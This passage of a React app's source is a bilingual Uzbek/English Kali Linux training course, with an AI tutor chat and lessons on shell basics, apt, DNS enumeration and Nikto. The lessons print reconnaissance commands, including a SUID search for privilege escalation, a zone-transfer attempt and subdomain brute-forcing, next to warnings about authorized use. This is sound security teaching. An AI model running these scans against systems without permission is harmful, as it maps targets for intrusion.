            nProv&&React.createElement("div",{style:{position:"relative",marginBottom:6}},
              React.createElement("input",{type:showKey?"text":"password",placeholder:PROVS.find(p=>p.id===nProv)?.hint||"",value:nKey,onChange:e=>setNKey(e.target.value),
                style:{width:"100%",boxSizing:"border-box",background:"rgba(0,0,0,0.3)",border:"1px solid var(--border)",borderRadius:6,padding:"7px 32px 7px 10px",fontSize:11,fontFamily:"var(--font-mono)",color:"var(--text-0)",outline:"none"}}),
              React.createElement("button",{onClick:()=>setShowKey(s=>!s),style:{position:"absolute",right:8,top:"50%",transform:"translateY(-50%)",background:"none",border:"none",cursor:"pointer",color:"var(--text-3)",fontSize:12,padding:0}},showKey?"🙈":"👁")
            ),
            React.createElement("div",{style:{display:"flex",gap:5}},
              React.createElement("button",{onClick:()=>{setAdding(false);setNProv("");setNKey("");},style:{flex:"0 0 auto",padding:"5px 10px",borderRadius:5,cursor:"pointer",appearance:"none",border:"1px solid var(--border)",background:"transparent",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700}},t(lang,"Bekor","Cancel")),
              React.createElement("button",{onClick:addKey,disabled:!nProv||!nKey.trim(),style:{flex:1,padding:"5px 0",borderRadius:5,cursor:nProv&&nKey.trim()?"pointer":"not-allowed",appearance:"none",border:`1px solid ${nProv&&nKey.trim()?"var(--accent)":"var(--border)"}`,background:nProv&&nKey.trim()?"var(--accent)":"transparent",color:nProv&&nKey.trim()?"#04060d":"var(--text-3)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700}},t(lang,"Qo'shish","Add"))
            )
          ),
          !adding&&aiKeys.length<3&&React.createElement("button",{onClick:()=>setAdding(true),style:{width:"100%",marginTop:5,padding:"6px 0",borderRadius:7,cursor:"pointer",appearance:"none",border:"1px dashed var(--border)",background:"transparent",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:600}},
            `+ ${t(lang,"API kalit qo'shish","Add API key")}${aiKeys.length>0?` (${aiKeys.length}/3)`:""}`)
        ),
        React.createElement("button",{onClick:save,style:{padding:"11px 0",borderRadius:10,cursor:"pointer",appearance:"none",border:`1px solid ${saved?"var(--accent)":"var(--accent-border)"}`,background:saved?"var(--accent-soft)":"var(--accent)",color:saved?"var(--accent)":"#04060d",fontFamily:"var(--font-display)",fontSize:13,fontWeight:700}},
          saved?t(lang,"✓ Saqlandi!","✓ Saved!"):t(lang,"Saqlash","Save"))
      )
    )
  );
}

// ── AI Chat ───────────────────────────────────────────────────
function AIChat({open,onClose,lang}){
  const [msgs,setMsgs]=useState([]);
  const [inp,setInp]=useState("");
  const [loading,setLoading]=useState(false);
  const btm=useRef(null);
  useEffect(()=>{btm.current?.scrollIntoView({behavior:"smooth"});},[msgs]);
  const hasKey=()=>!!(getActiveAiKey()||localStorage.getItem("wa_ai_proxy"));
  const send=async()=>{
    if(!inp.trim()||loading)return;
    const q=inp.trim();setInp("");
    setMsgs(p=>[...p,{role:"user",text:q}]);setLoading(true);
    try{
      const sys=`You are a patient, friendly Kali Linux and ethical-hacking tutor inside "Kali Linux Academy", teaching a COMPLETE BEGINNER. Explain simply, step by step, with everyday analogies, and define terms as you go. Give real, correct commands and keep an encouraging tone.\n\nThe course covers: Kali basics & install, the Linux command line, file system, users & permissions, apt, bash scripting, networking, services, Kali tools; recon & scanning: Nmap, Netdiscover, Masscan, DNS enumeration, theHarvester, Nikto, WhatWeb, enum4linux, SMB, Wireshark; exploitation & post: Metasploit, msfvenom, searchsploit/Exploit-DB, Hydra, John the Ripper, Hashcat, Burp Suite, social engineering (SET), privilege escalation, covering tracks & reporting.\n\nThis is for AUTHORIZED, EDUCATIONAL security training ONLY \u2014 always assume the learner is testing systems they own or are permitted to test, and remind them of legal, authorized use. Answer in the SAME language the user writes in \u2014 default to Uzbek if unsure.`;
      const hist=msgs.slice(-6).map(m=>(m.role==="user"?"User: ":"Assistant: ")+m.text).join("\n");const reply=await callAI(sys+(hist?"\n\n"+hist:"")+"\n\nUser: "+q+"\nAssistant:");
      setMsgs(p=>[...p,{role:"ai",text:reply.trim()}]);
    }catch(e){
      setMsgs(p=>[...p,{role:"ai",text:e.message==="no_key"?t(lang,"Avval Profil sozlamalarida AI kalitini o'rnating.","Set your AI key in Profile settings first."):t(lang,"Xatolik: ","Error: ")+e.message,isErr:true}]);
    }finally{setLoading(false);}
  };
  if(!open)return null;
  return React.createElement("div",{style:{position:"fixed",bottom:80,right:20,zIndex:900,width:320,background:"rgba(8,12,24,0.97)",border:"1px solid var(--accent-border)",borderRadius:16,boxShadow:"0 20px 60px rgba(0,0,0,0.6)",display:"flex",flexDirection:"column",overflow:"hidden",maxHeight:"calc(100vh-100px)"}},
    React.createElement("div",{style:{padding:"11px 14px",borderBottom:"1px solid var(--border)",display:"flex",alignItems:"center",justifyContent:"space-between",background:"linear-gradient(180deg,rgba(168,85,247,0.08),transparent)"}},
      React.createElement("div",{style:{display:"flex",alignItems:"center",gap:8}},
        React.createElement("div",{style:{width:28,height:28,borderRadius:7,background:"var(--accent-soft)",border:"1px solid var(--accent-border)",display:"grid",placeItems:"center"}},
          React.createElement(Icon,{name:"spark",size:13,style:{color:"var(--accent)"}})
        ),
        React.createElement("div",null,
          React.createElement("div",{style:{fontWeight:600,fontSize:12}},t(lang,"AI Muallim","AI Tutor")),
          React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:8,color:"var(--accent)",letterSpacing:0.5}},"KALI ACADEMY")
        )
      ),
      React.createElement("button",{onClick:onClose,style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)"}},React.createElement(Icon,{name:"x",size:14}))
    ),
    React.createElement("div",{style:{flex:1,overflowY:"auto",padding:"12px 12px 0",minHeight:240}},
      msgs.length===0&&React.createElement("div",{style:{textAlign:"center",padding:"20px 10px",color:"var(--text-3)",fontSize:12}},
        React.createElement("div",{style:{fontSize:28,marginBottom:8}},"🐉"),
        t(lang,"Kali va pentest haqida savol bering!","Ask about Kali & pentesting!"),
        !hasKey()&&React.createElement("div",{style:{marginTop:8,padding:"8px 10px",background:"rgba(255,180,0,0.08)",border:"1px solid rgba(255,180,0,0.25)",borderRadius:8,fontSize:11,color:"var(--c-warn)"}},
          t(lang,"⚠ Profilda AI kalitini o'rnating.","⚠ Set AI key in Profile."))
      ),
      msgs.map((m,i)=>React.createElement("div",{key:i,style:{marginBottom:8,display:"flex",flexDirection:"column",alignItems:m.role==="user"?"flex-end":"flex-start"}},
        React.createElement("div",{style:{maxWidth:"88%",padding:"7px 11px",borderRadius:m.role==="user"?"10px 10px 3px 10px":"10px 10px 10px 3px",background:m.role==="user"?"var(--accent)":m.isErr?"rgba(255,80,80,0.1)":"var(--surface)",border:m.role==="user"?"none":`1px solid ${m.isErr?"rgba(255,80,80,0.3)":"var(--border)"}`,color:m.role==="user"?"#04060d":m.isErr?"#ff6666":"var(--text-0)",fontSize:12,lineHeight:1.6,whiteSpace:"pre-wrap",wordBreak:"break-word"}},m.text)
      )),
      loading&&React.createElement("div",{style:{marginBottom:8}},React.createElement("div",{style:{padding:"7px 12px",borderRadius:"10px 10px 10px 3px",background:"var(--surface)",border:"1px solid var(--border)",fontSize:14,color:"var(--text-3)",letterSpacing:2}},"···")),
      React.createElement("div",{ref:btm,style:{height:12}})
    ),
    React.createElement("div",{style:{padding:"8px 10px",borderTop:"1px solid var(--border)",display:"flex",gap:6}},
      React.createElement("input",{value:inp,onChange:e=>setInp(e.target.value),onKeyDown:e=>{if(e.key==="Enter"&&!e.shiftKey){e.preventDefault();send();}},placeholder:t(lang,"Savol bering…","Ask a question…"),
        style:{flex:1,background:"var(--bg-2)",border:"1px solid var(--border)",borderRadius:7,padding:"7px 10px",color:"var(--text-0)",fontSize:12,outline:"none"}}),
      React.createElement("button",{onClick:send,disabled:!inp.trim()||loading,style:{appearance:"none",border:"none",cursor:inp.trim()&&!loading?"pointer":"not-allowed",width:32,height:32,borderRadius:7,flexShrink:0,background:inp.trim()&&!loading?"var(--accent)":"var(--surface)",color:inp.trim()&&!loading?"#04060d":"var(--text-3)",display:"grid",placeItems:"center"}},
        React.createElement(Icon,{name:"send",size:13}))
    )
  );
}

// ── App Root ──────────────────────────────────────────────────
function App(){
  const [theme,_setTheme]=useState(()=>{try{return localStorage.getItem(THEME_KEY)||"violet";}catch{return"violet";}});
  const setTheme=v=>{_setTheme(v);try{localStorage.setItem(THEME_KEY,v);}catch{}};
  const [lang,_setLang]=useState(()=>{try{return localStorage.getItem(LANG_KEY)||"uz";}catch{return"uz";}});
  const setLang=v=>{_setLang(v);try{localStorage.setItem(LANG_KEY,v);}catch{}};
  const [progress,_setProgress]=useState(loadProgress);
  const updateProgress=useCallback(patch=>{_setProgress(p=>{const n={...p,...patch};saveProgress(n);return n;});},[]);
  const markComplete=useCallback(key=>{_setProgress(p=>{if((p.completedLessons||[]).includes(key))return p;const cl=[...(p.completedLessons||[]),key];const xp=(p.xp||0)+50;const n={...p,completedLessons:cl,xp,level:xpToLevel(xp)};saveProgress(n);return n;});},[]);
  const [route,_setRoute]=useState(()=>{try{const s=localStorage.getItem(ROUTE_KEY);if(s)return JSON.parse(s);}catch{}return"landing";});
  const setRoute=r=>{_setRoute(r);try{localStorage.setItem(ROUTE_KEY,JSON.stringify(r));}catch{};window.scrollTo({top:0,behavior:"instant"});};
  const [profileOpen,setProfileOpen]=useState(false);
  const [aiOpen,setAiOpen]=useState(false);

  useEffect(()=>{
    const th=theme;
    document.documentElement.setAttribute("data-theme",th);
    const colors={violet:"#a855f7",cyan:"#00d4ff",green:"#00ff88"};
    const c=colors[th]||colors.violet;
    const r=document.documentElement.style;
    r.setProperty("--accent",c);
    r.setProperty("--accent-glow",`${c}72`);
    r.setProperty("--accent-soft",`${c}1e`);
    r.setProperty("--accent-border",`${c}47`);
  },[theme]);

  const user={...progress,completedLessons:progress.completedLessons||[]};
  const routeName=typeof route==="string"?route:route?.name;
  const navProps={setRoute,user,setLang,onOpenProfile:()=>setProfileOpen(true),onOpenAI:()=>setAiOpen(true)};

  return React.createElement(LangCtx.Provider,{value:lang},
    React.createElement("div",null,
      routeName!=="landing"&&React.createElement(TopNav,navProps),
      routeName==="landing"?React.createElement(LandingScreen,{setRoute,setLang}):
      routeName==="dashboard"?React.createElement(DashboardScreen,{...navProps}):
      routeName==="section"?React.createElement(SectionScreen,{...navProps,sec:route?.sec||1}):
      routeName==="lesson"?React.createElement(LessonScreen,{...navProps,markComplete,num:route?.num||1}):
      React.createElement(LandingScreen,{setRoute,setLang}),
      profileOpen&&React.createElement(ProfileModal,{user,theme,setTheme,lang,onClose:()=>setProfileOpen(false),onSave:patch=>{updateProgress({name:patch.name});setProfileOpen(false);}}),
      React.createElement(AIChat,{open:aiOpen,onClose:()=>setAiOpen(false),lang})
    )
  );
}


// ── L03: Command line basics ──────────────────────────────────
function LessonL03(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Nega buyruq qatori?","Why the command line?")),
    React.createElement(P,null,t(lang,"Kali'da ishning 90% terminalda bajariladi. Buyruq qatori (CLI) grafik interfeysdan tezroq, avtomatlashtirishga qulay va masofaviy serverlarda (SSH orqali) ko'pincha yagona imkoniyat bo'ladi. Pentester uchun bash'ni bilish — sport zaliga borishdek asosiy ko'nikma: qanchalik ravon bo'lsangiz, shunchalik tez ishlaysiz.","About 90% of the work in Kali happens in the terminal. The command line (CLI) is faster than a GUI, easy to automate, and on remote servers (over SSH) is often the only option. For a pentester, knowing bash is a core skill like going to the gym: the more fluent you are, the faster you work.")),
    React.createElement(H2,{num:"§2"},t(lang,"Buyruq toifalari","Command categories")),
    React.createElement(LayerStack,{layers:[
      {n:"📁",name:t(lang,"Navigatsiya","Navigation"),color:"#4dabf7",desc:{uz:"pwd (qayerdaman), ls (nima bor), cd (o'tish).",en:"pwd (where am I), ls (what's here), cd (move)."}},
      {n:"✏",name:t(lang,"Fayl amallari","File operations"),color:"#69db7c",desc:{uz:"cp (nusxa), mv (ko'chirish/nom), rm (o'chirish), mkdir, touch.",en:"cp (copy), mv (move/rename), rm (delete), mkdir, touch."}},
      {n:"🔎",name:t(lang,"Qidirish","Searching"),color:"#a855f7",desc:{uz:"grep (matn ichidan), find (fayl nomi bo'yicha), locate.",en:"grep (inside text), find (by file name), locate."}},
      {n:"🔗",name:t(lang,"Quvur & yo'naltirish","Pipes & redirect"),color:"#ffd43b",desc:{uz:"| bilan buyruqlarni ulash, >/>> bilan faylga yozish.",en:"Chain commands with |, write to a file with >/>>."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Navigatsiya va fayllar chuqurroq","Navigation and files in depth")),
    React.createElement(P,null,t(lang,"ls oddiy ro'yxat beradi, lekin bayroqlar uni kuchaytiradi: ls -l batafsil ko'rinish (ruxsatlar, egasi, o'lcham, sana), ls -a yashirin fayllarni ham (nuqta bilan boshlanuvchilar), ls -lh o'lchamlarni o'qilishi qulay ko'rsatadi (KB/MB). cd .. bir daraja yuqoriga, cd ~ uy katalogiga, cd - oldingi katalogga qaytaradi. Bu kichik bayroqlar tezlikni sezilarli oshiradi.","ls gives a plain list, but flags supercharge it: ls -l is the detailed view (permissions, owner, size, date), ls -a shows hidden files too (those starting with a dot), ls -lh shows sizes in human-readable form (KB/MB). cd .. goes one level up, cd ~ to the home directory, cd - back to the previous directory. These small flags noticeably boost speed.")),
    React.createElement(H2,{num:"§4"},t(lang,"Fayllarni ko'rish","Viewing files")),
    React.createElement(P,null,t(lang,"Faylni ochishning bir necha usuli bor: cat butun faylni ekranga chiqaradi (kichik fayllar uchun); less faylni sahifalab ko'rsatadi (katta loglar uchun, o'q tugmalari bilan aylantiriladi); head -n 20 birinchi 20 qatorni, tail -n 20 oxirgi 20 qatorni beradi; tail -f faylni real vaqtda kuzatadi (loglarni jonli ko'rish uchun). Har biri o'z o'rnida foydali.","There are several ways to read a file: cat prints the whole file (for small files); less shows it page by page (for large logs, scroll with arrow keys); head -n 20 gives the first 20 lines, tail -n 20 the last 20; tail -f watches a file in real time (to see logs live). Each is useful in its place.")),
    React.createElement(H2,{num:"§5"},t(lang,"Quvur va yo'naltirish","Pipes and redirection")),
    React.createElement(P,null,t(lang,"Buyruqlarning haqiqiy kuchi ularni birlashtirishda. Quvur (|) bir buyruqning chiqishini boshqasining kirishiga uzatadi. > chiqishni faylga yozadi (eskisini o'chirib), >> faylga qo'shadi. 2> xatolarni alohida faylga, &> hammasini (chiqish+xato) bir faylga yo'naltiradi. Bu belgilar orqali murakkab ish oqimlarini bir qatorda quyasiz.","The real power of commands is in combining them. A pipe (|) sends one command's output into another's input. > writes output to a file (overwriting), >> appends. 2> redirects errors to a separate file, &> everything (output+errors) to one file. With these symbols you build complex workflows in a single line.")),
    React.createElement(H2,{num:"§6"},t(lang,"Wildcard va yordam","Wildcards and help")),
    React.createElement(P,null,t(lang,"Wildcard'lar ko'p faylni bir vaqtda tanlaydi: * har qanday belgilar (*.txt — barcha .txt fayllar), ? bitta belgi, [abc] qavsdagi belgilardan biri. Yordam kerak bo'lsa: man buyruq to'liq qo'llanma, buyruq --help qisqa yordam, tldr buyruq sodda misollar beradi.","Wildcards select many files at once: * any characters (*.txt — all .txt files), ? one character, [abc] one of the bracketed characters. When you need help: man command is the full manual, command --help a short help, tldr command gives simple examples.")),
    React.createElement(Terminal,null,"# Ochiq portlarni sanab, faylga yozish\ncat scan.txt | grep open | wc -l\n\n# SUID fayllarni topib, xatolarni yashirish (privesc uchun)\nfind / -perm -4000 2>/dev/null > suid.txt\n\n# Barcha .conf fayllarni topish\nfind /etc -name \"*.conf\""),
    React.createElement(Quiz,{q:{uz:"Qaysi belgi bir buyruq chiqishini ikkinchisiga uzatadi?",en:"Which symbol sends one command's output into another?"},opts:[{uz:"> (yo'naltirish)",en:"> (redirect)"},{uz:"| (quvur)",en:"| (pipe)"},{uz:"& (fon)",en:"& (background)"},{uz:"# (izoh)",en:"# (comment)"}],correct:1,exp:{uz:"Quvur (|) birinchi buyruqning standart chiqishini ikkinchisining standart kirishiga uzatadi. > esa faylga yozadi.",en:"The pipe (|) connects the first command's stdout to the second's stdin. > writes to a file instead."}}));
}
function LessonL06(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"apt nima?","What is apt?")),
    React.createElement(P,null,t(lang,"Kali Debian asosida bo'lgani uchun dasturlarni apt (Advanced Package Tool) orqali o'rnatadi. apt — bu \"dastur do'koni\"ning buyruq qatoridagi ko'rinishi: u paketlarni markaziy omborlardan (repository) yuklab oladi, o'rnatadi, yangilaydi va o'chiradi. Eng muhimi — u bog'liqliklarni (dependencies) avtomatik hal qiladi: agar dastur boshqa kutubxonaga muhtoj bo'lsa, apt uni ham o'zi topib o'rnatadi.","Because Kali is Debian-based, it installs software via apt (Advanced Package Tool). apt is the command-line version of an \"app store\": it downloads packages from central repositories, installs, updates and removes them. Most importantly, it resolves dependencies automatically: if a program needs another library, apt finds and installs it too.")),
    React.createElement(H2,{num:"§2"},t(lang,"Paket o'rnatish oqimi","The package-install flow")),
    React.createElement(FlowSteps,{title:{uz:"apt bilan o'rnatish",en:"Installing with apt"},steps:[
      {icon:"🔄",text:{uz:"sudo apt update — paket ro'yxatini yangilash (avval!)",en:"sudo apt update — refresh the package list (first!)"}},
      {icon:"🔎",text:{uz:"apt search gobuster — kerakli paketni topish",en:"apt search gobuster — find the package"}},
      {icon:"⬇",text:{uz:"sudo apt install gobuster — o'rnatish (+ bog'liqliklar)",en:"sudo apt install gobuster — install (+ dependencies)"}},
      {icon:"✓",text:{uz:"which gobuster — o'rnatilganini tekshirish",en:"which gobuster — confirm it's installed"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"update va upgrade farqi","update vs upgrade")),
    React.createElement(P,null,t(lang,"Ko'p yangi boshlovchilar bu ikkisini chalkashtiradi. apt update — omborlardan yangi paket RO'YXATINI yuklab oladi (qanday versiyalar mavjudligini biladi), lekin hech narsani o'rnatmaydi. apt upgrade — o'rnatilgan paketlarni ro'yxatdagi yangi versiyalarga YANGILAYDI. Shuning uchun tartib muhim: avval update (ro'yxatni yangilash), keyin upgrade (haqiqiy yangilash). apt full-upgrade esa kerak bo'lsa eski paketlarni olib tashlab, chuqurroq yangilaydi.","Many beginners confuse these two. apt update downloads the new package LIST from the repositories (it learns what versions are available) but installs nothing. apt upgrade UPGRADES installed packages to the newer versions in that list. So order matters: update first (refresh the list), then upgrade (do the real update). apt full-upgrade goes deeper, removing old packages if needed.")),
    React.createElement(H2,{num:"§4"},t(lang,"Asosiy buyruqlar","Core commands")),
    React.createElement(P,null,t(lang,"install — o'rnatadi; remove — dasturni o'chiradi (sozlamalarni qoldiradi); purge — dasturni sozlamalari bilan to'liq o'chiradi; autoremove — endi kerak bo'lmagan bog'liqliklarni tozalaydi. search nom bo'yicha qidiradi, show esa paket haqida batafsil ma'lumot (versiya, o'lcham, tavsif) beradi. dpkg -l esa o'rnatilgan barcha paketlarni sanaydi.","install installs; remove deletes the program (leaving its config); purge fully removes the program with its config; autoremove cleans up dependencies no longer needed. search finds by name, show gives details about a package (version, size, description). dpkg -l lists all installed packages.")),
    React.createElement(H2,{num:"§5"},t(lang,"Omborlar va metapaketlar","Repositories and metapackages")),
    React.createElement(P,null,t(lang,"apt qayerdan paket olishini /etc/apt/sources.list fayli belgilaydi. Kali uchun faqat rasmiy Kali omborlaridan foydalaning — noma'lum manbalar tizimga zararli dastur olib kirishi mumkin. Kali barcha 600+ vositani birdan o'rnatishni talab qilmaydi: metapaketlar orqali kerakli to'plamni o'rnatasiz — kali-linux-large (ko'p vosita), kali-tools-web (faqat veb vositalar), kali-tools-wireless va h.k.","Where apt gets packages from is defined in /etc/apt/sources.list. For Kali, use only the official Kali repositories — unknown sources can bring malware into the system. Kali doesn't force you to install all 600+ tools at once: metapackages install a focused set — kali-linux-large (many tools), kali-tools-web (web tools only), kali-tools-wireless, and so on.")),
    React.createElement(Terminal,null,"sudo apt update && sudo apt full-upgrade -y\nsudo apt install nikto        # o'rnatish\nsudo apt purge nikto          # sozlamalari bilan o'chirish\nsudo apt autoremove           # keraksiz bog'liqliklarni tozalash\napt show nmap                 # paket haqida ma'lumot\nsudo apt install kali-tools-web   # metapaket"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"apt upgrade dan oldin DOIM apt update bajaring — aks holda apt eski ro'yxatdan foydalanadi va yangilanishlarni topa olmaydi yoki buzilgan bog'liqliklarga duch keladi.","Always run apt update before apt upgrade — otherwise apt uses a stale list and may miss updates or hit broken dependencies.")),
    React.createElement(Quiz,{q:{uz:"Yangi dastur o'rnatishdan oldin qaysi buyruqni bajarish kerak?",en:"Which command should you run before installing a new package?"},opts:[{uz:"apt remove",en:"apt remove"},{uz:"apt update",en:"apt update"},{uz:"apt clean",en:"apt clean"},{uz:"apt purge",en:"apt purge"}],correct:1,exp:{uz:"apt update paket ro'yxatini yangilaydi — shundan keyingina apt to'g'ri (eng so'nggi) versiyani topib o'rnatadi.",en:"apt update refreshes the package list — only then can apt find and install the correct (latest) version."}}));
}
function LessonL14(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"DNS enumeratsiya nima uchun?","Why DNS enumeration?")),
    React.createElement(P,null,t(lang,"DNS — internetning telefon kitobi. Enumeratsiyada nishon domenning subdomenlarini, pochta serverlarini (MX), nom serverlarini (NS) va IP manzillarini to'playmiz. Nega? Chunki har bir subdomen (masalan mail.example.com, dev.example.com, vpn.example.com) yangi hujum yuzasi — ko'pincha kompaniyalar asosiy saytini yaxshi himoya qiladi, lekin unutilgan test yoki eski subdomenlar zaif qoladi.","DNS is the internet's phone book. In enumeration we collect a target domain's subdomains, mail servers (MX), name servers (NS) and IP addresses. Why? Because every subdomain (e.g. mail.example.com, dev.example.com, vpn.example.com) is a new attack surface — companies often protect their main site well, but forgotten test or legacy subdomains stay weak.")),
    React.createElement(H2,{num:"§2"},t(lang,"Enumeratsiya oqimi","Enumeration flow")),
    React.createElement(FlowSteps,{title:{uz:"DNS enumeratsiya",en:"DNS enumeration"},steps:[
      {icon:"📇",text:{uz:"Asosiy yozuvlar: dig A, MX, NS",en:"Basic records: dig A, MX, NS"}},
      {icon:"🔓",text:{uz:"Zona transferini sinash (AXFR) — ochiq bo'lsa oltin",en:"Try a zone transfer (AXFR) — a goldmine if open"}},
      {icon:"🧩",text:{uz:"Subdomenlarni brute-force qilish (lug'at bilan)",en:"Brute-force subdomains (with a wordlist)"}},
      {icon:"🗺",text:{uz:"Barcha topilgan xost/IP ni xaritalash",en:"Map all discovered hosts/IPs"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"DNS yozuv turlari","DNS record types")),
    React.createElement(P,null,t(lang,"Har yozuv turi boshqacha ma'lumot beradi: A — domenni IPv4 ga bog'laydi (asosiy); AAAA — IPv6 ga; MX — pochta serverlarini ko'rsatadi (fishing hujumlari uchun foydali); NS — domenni boshqaruvchi nom serverlari; CNAME — bir nomni boshqasiga taxallus qiladi (ko'pincha bulut xizmatlarini ochib beradi); TXT — matn yozuvlari (SPF, DKIM kabi xavfsizlik sozlamalari, ba'zan maxfiy ma'lumot). Bularning har biri nishon infratuzilmasi haqida yangi tafsilot beradi.","Each record type gives different information: A — maps the domain to IPv4 (the main one); AAAA — to IPv6; MX — points to the mail servers (useful for phishing); NS — the name servers running the domain; CNAME — aliases one name to another (often revealing cloud services); TXT — text records (security settings like SPF, DKIM, sometimes sensitive data). Each of these adds a new detail about the target's infrastructure.")),
    React.createElement(H2,{num:"§4"},t(lang,"Zona transferi va brute-force","Zone transfer and brute-force")),
    React.createElement(P,null,t(lang,"Ikki asosiy usul bor. Zona transferi (AXFR) — noto'g'ri sozlangan DNS serverdan butun zonani (barcha yozuvlarni) bir so'rovda so'rash. Ochiq AXFR — jiddiy noto'g'ri konfiguratsiya va oltin ma'lumot manbasi, lekin bugun kam uchraydi. Brute-force esa lug'atdagi har bir so'zni domen oldiga qo'yib sinaydi (dev, test, admin, vpn...) — bu ko'proq ishlaydi. dnsenum, dnsrecon, fierce va gobuster dns bu vositalar sirasiga kiradi.","There are two main approaches. Zone transfer (AXFR) — asking a misconfigured DNS server for the entire zone (all records) in one request. An open AXFR is a serious misconfiguration and a goldmine, but rare today. Brute-force tries each word from a wordlist prefixed to the domain (dev, test, admin, vpn...) — this works more often. dnsenum, dnsrecon, fierce and gobuster dns are tools for this.")),
    React.createElement(Terminal,null,"dig example.com A\ndig example.com MX\ndig axfr @ns1.example.com example.com   # zona transfer\ndnsenum example.com\ndnsrecon -d example.com -t brt -D /usr/share/wordlists/subdomains.txt"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"DNS enumeratsiyani faqat sizga tegishli yoki ruxsat berilgan domenlarda o'tkazing.","Only perform DNS enumeration on domains you own or are authorized to test.")),
    React.createElement(Quiz,{q:{uz:"Noto'g'ri sozlangan DNS serverdan butun zona yozuvlarini olish urinishi qanday ataladi?",en:"Pulling all zone records from a misconfigured DNS server is called?"},opts:[{uz:"Zona transferi (AXFR)",en:"Zone transfer (AXFR)"},{uz:"Reverse lookup",en:"Reverse lookup"},{uz:"Cache poisoning",en:"Cache poisoning"},{uz:"DNS tunneling",en:"DNS tunneling"}],correct:0,exp:{uz:"Zona transferi (AXFR) domenning barcha DNS yozuvlarini bir so'rovda oladi; ochiq AXFR jiddiy zaiflik hisoblanadi.",en:"A zone transfer (AXFR) retrieves all of a domain's DNS records in one request; an open AXFR is a serious vulnerability."}}));
}
function LessonL16(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Nikto nima?","What is Nikto?")),
    React.createElement(P,null,t(lang,"Nikto — ochiq kodli veb-server skaneri. U 6700 dan ortiq potentsial xavfli fayl va dasturni, eskirgan server versiyalarini va noto'g'ri konfiguratsiyalarni tekshiradi. Uni veb-serverga qarshi \"tez tibbiy ko'rik\" deb tasavvur qiling: bir necha daqiqada ma'lum muammolar ro'yxatini beradi. U tez, lekin \"shovqinli\" — yuzlab so'rov yuboradi, shuning uchun IDS/IPS uni oson aniqlaydi.","Nikto is an open-source web server scanner. It checks for 6700+ potentially dangerous files and programs, outdated server versions and misconfigurations. Think of it as a \"quick medical checkup\" against a web server: in minutes it gives a list of known issues. It's fast but \"noisy\" — it sends hundreds of requests, so IDS/IPS detect it easily.")),
    React.createElement(H2,{num:"§2"},t(lang,"Skan oqimi","Scan flow")),
    React.createElement(FlowSteps,{title:{uz:"Nikto skan",en:"Nikto scan"},steps:[
      {icon:"🎯",text:{uz:"Nishon veb-serverga ulanish",en:"Connect to the target web server"}},
      {icon:"🗂",text:{uz:"6700+ ma'lum xavfli yo'l/fayl sinovi",en:"Test 6700+ known dangerous paths/files"}},
      {icon:"🏷",text:{uz:"Server versiyasi va sarlavhalarni tekshirish",en:"Check server version and headers"}},
      {icon:"📋",text:{uz:"Topilmalar hisobotga yoziladi",en:"Findings written to a report"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Nikto nimalarni topadi?","What Nikto finds")),
    React.createElement(P,null,t(lang,"Nikto bir necha turdagi muammoni qidiradi: eskirgan server versiyalari (ma'lum CVE'lar bilan), xavfli standart fayllar (test sahifalari, admin panellari, zaxira nusxalari), noto'g'ri sozlangan sarlavhalar (yetishmayotgan xavfsizlik sarlavhalari), va ochiq qoldirilgan katalogar. Har topilma yonida ko'pincha unga tegishli OSVDB yoki CVE havolasi beriladi — bu keyingi tadqiqot uchun boshlang'ich nuqta.","Nikto looks for several kinds of issues: outdated server versions (with known CVEs), dangerous default files (test pages, admin panels, backups), misconfigured headers (missing security headers), and exposed directories. Each finding often comes with an OSVDB or CVE reference — a starting point for further research.")),
    React.createElement(H2,{num:"§4"},t(lang,"Sozlamalar va proksi","Options and proxy")),
    React.createElement(P,null,t(lang,"-Tuning bilan qaysi turdagi sinovlarni ishga tushirishni tanlaysiz (masalan faqat SQLi yoki fayl yuklash sinovlari) — bu tezlashtiradi va shovqinni kamaytiradi. -o report.html -Format htm bilan natijani chiroyli HTML hisobotga saqlaysiz. -useproxy bilan esa Nikto trafigini Burp Suite orqali o'tkazasiz — bu so'rovlarni qo'lda tahlil qilish uchun qulay.","With -Tuning you choose which test types to run (e.g. only SQLi or file-upload tests) — this speeds it up and reduces noise. With -o report.html -Format htm you save results to a nice HTML report. With -useproxy you route Nikto's traffic through Burp Suite — handy for analyzing the requests by hand.")),
    React.createElement(Terminal,null,"nikto -h http://target.com\nnikto -h target.com -p 8080 -ssl\nnikto -h target.com -Tuning 1234        # tanlangan sinovlar\nnikto -h target.com -o report.html -Format htm\nnikto -h target.com -useproxy http://127.0.0.1:8080  # Burp orqali"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Nikto ni faqat sizga tegishli yoki yozma ruxsat berilgan tizimlarda ishlating. Ruxsatsiz skanerlash ko'p mamlakatda qonunga zid.","Only use Nikto on systems you own or are authorized to test. Unauthorized scanning is illegal in many countries.")),
